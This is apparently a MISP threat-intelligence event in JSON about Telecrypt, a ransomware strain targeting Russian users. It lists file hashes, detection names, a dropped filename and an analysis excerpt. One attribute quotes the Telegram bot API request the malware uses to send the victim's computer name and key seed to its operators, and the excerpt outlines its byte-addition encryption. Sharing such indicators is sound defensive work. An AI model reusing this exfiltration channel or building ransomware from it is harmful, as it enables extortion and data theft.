{
    "Event":{
        "threat_level_id":"3",
        "date":"2016-11-11",
        "published":true,
        "info":"OSINT - The first cryptor to exploit Telegram",
        "publish_timestamp":"1478861240",
        "timestamp":"1478861156",
        "Tag":[
            {
                "name":"tlp:white"
            },
            {
                "name":"osint:source-type=\"blog-post\""
            },
            {
                "name":"circl:incident-classification=\"malware\""
            },
            {
                "name":"ecsirt:malicious-code=\"ransomware\""
            },
            {
                "name":"malware_classification:malware-category=\"Ransomware\""
            },
            {
                "name":"ms-caro-malware:malware-type=\"Ransom\""
            },
            {
                "name":"enisa:nefarious-activity-abuse=\"ransomware\""
            }
        ],
        "Attribute":[
            {
                "category":"External analysis",
                "comment":"",
                "timestamp":"1478860252",
                "type":"comment",
                "value":"Earlier this month, we discovered a piece of encryption malware targeting Russian users. One of its peculiarities was that it uses Telegram Messengerâ€™s communication protocol to send a decryption key to the threat actor. To our knowledge, this is the first cryptor to use the Telegram protocol in an encryption malware case.\r\nWhat is a cryptor?\r\n\r\nIn general, cryptors can be classified into two groups: those which maintain offline encryption and those which donâ€™t.\r\n\r\nThere are several reasons why file encryption malware requires an Internet connection. For instance, the threat actors may send an encryption key to the cryptor and receive data from it which they can later use to decrypt the victimâ€™s encrypted files.\r\n\r\nObviously, a special service is required on the threat actorâ€™s side to receive data from the cryptor malware. That service must be protected from third-party researchers, and this creates extra software development costs.",
                "to_ids":false
            },
            {
                "category":"External analysis",
                "comment":"",
                "timestamp":"1478860273",
                "type":"link",
                "value":"https://securelist.com/blog/research/76558/the-first-cryptor-to-exploit-telegram/",
                "to_ids":false
            },
            {
                "category":"Payload delivery",
                "comment":"Trojan-Ransom.Win32.Telecrypt.a (the main module)",
                "timestamp":"1478860349",
                "type":"md5",
                "value":"<md5>",
                "to_ids":true
            },
            {
                "category":"Payload delivery",
                "comment":"Trojan-Ransom.Win32.Telecrypt.a (the â€˜Informerâ€™ module).",
                "timestamp":"1478860349",
                "type":"md5",
                "value":"<md5>",
                "to_ids":true
            },
            {
                "category":"Payload delivery",
                "comment":"Trojan-Ransom.Win32.Telecrypt.a (the â€˜Informerâ€™ module). - Xchecked via VT: 14d4bc13a12f8243383756de92529d6d",
                "timestamp":"1478860394",
                "type":"sha256",
                "value":"<sha256>",
                "to_ids":true
            },
            {
                "category":"Payload delivery",
                "comment":"Trojan-Ransom.Win32.Telecrypt.a (the â€˜Informerâ€™ module). - Xchecked via VT: 14d4bc13a12f8243383756de92529d6d",
                "timestamp":"1478860394",
                "type":"sha1",
                "value":"<sha1>",
                "to_ids":true
            },
            {
                "category":"External analysis",
                "comment":"Trojan-Ransom.Win32.Telecrypt.a (the â€˜Informerâ€™ module). - Xchecked via VT: 14d4bc13a12f8243383756de92529d6d",
                "timestamp":"1478860395",
                "type":"link",
                "value":"https://www.virustotal.com/file/63fa775052a5c7258d44a00d9f2b4a9263f96fb7c61778cbb1ba9102fed2082f/analysis/1478849458/",
                "to_ids":false
            },
            {
                "category":"Payload delivery",
                "comment":"Trojan-Ransom.Win32.Telecrypt.a (the main module) - Xchecked via VT: 3e24d064025ec20d6a8e8bae1d19ecdb",
                "timestamp":"1478860395",
                "type":"sha256",
                "value":"<sha256>",
                "to_ids":true
            },
            {
                "category":"Payload delivery",
                "comment":"Trojan-Ransom.Win32.Telecrypt.a (the main module) - Xchecked via VT: 3e24d064025ec20d6a8e8bae1d19ecdb",
                "timestamp":"1478860396",
                "type":"sha1",
                "value":"<sha1>",
                "to_ids":true
            },
            {
                "category":"External analysis",
                "comment":"Trojan-Ransom.Win32.Telecrypt.a (the main module) - Xchecked via VT: 3e24d064025ec20d6a8e8bae1d19ecdb",
                "timestamp":"1478860396",
                "type":"link",
                "value":"https://www.virustotal.com/file/3d7dd597a465d5275ef31d9e4f9dd80ed4de6139a1b3707cb3b0ffa068595567/analysis/1478857845/",
                "to_ids":false
            },
            {
                "category":"Antivirus detection",
                "comment":"",
                "timestamp":"1478860522",
                "type":"text",
                "value":"Trojan-Ransom.Win32.Telecrypt",
                "to_ids":false
            },
            {
                "category":"Antivirus detection",
                "comment":"",
                "timestamp":"1478860522",
                "type":"text",
                "value":"PDM:Trojan.Win32.Generic",
                "to_ids":false
            },
            {
                "category":"Artifacts dropped",
                "comment":". The Trojanâ€™s sample that we analyzed does not change file extensions. A list of encrypted files is saved to the text file",
                "timestamp":"1478860569",
                "type":"filename",
                "value":"%USERPROFILE%\\Desktop\\Ð‘Ð°Ð·Ð° Ð·Ð°ÑˆÐ¸Ñ„Ñ€ Ñ„Ð°Ð¹Ð»Ð¾Ð².txt",
                "to_ids":true
            },
            {
                "category":"Network activity",
                "comment":"",
                "timestamp":"1478860649",
                "type":"comment",
                "value":"https://api.telegram.org/bot<token>/sendmessage?chat_id=<chat>&text=<computer_name>_<infection_id>_<key_seed>\r\n\r\nThe Trojan sends the next request using the method â€˜sendMessageâ€™ which allows the bot to send messages to the chat thread of the specified number. The Trojan then uses the chat number hardwired into its body, and sends an â€œinfection successfulâ€ report to its creators:\r\n\r\nhttps://api.telegram.org/bot<token>/sendmessage?chat_id=<chat>&text=<computer_name>_<infection_id>_<key_seed>\r\n\r\nThe Trojan sends the following parameters in the request:\r\n\r\n<chat> â€“ number of the chat with the cybercriminal;\r\n\r\n<computer_name> â€“ name of the infected computer;\r\n\r\n<infection_id> â€“ infection ID;\r\n\r\n<key_seed> â€“ number used as a basis to generate the file encryption key.\r\n\r\nAfter sending the information, the Trojan searches the hard drives for files with specific extensions, and encrypts them bytewise, using the simple algorithm of adding each file byte to the key bytes.",
                "to_ids":false
            }
        ]
    }
}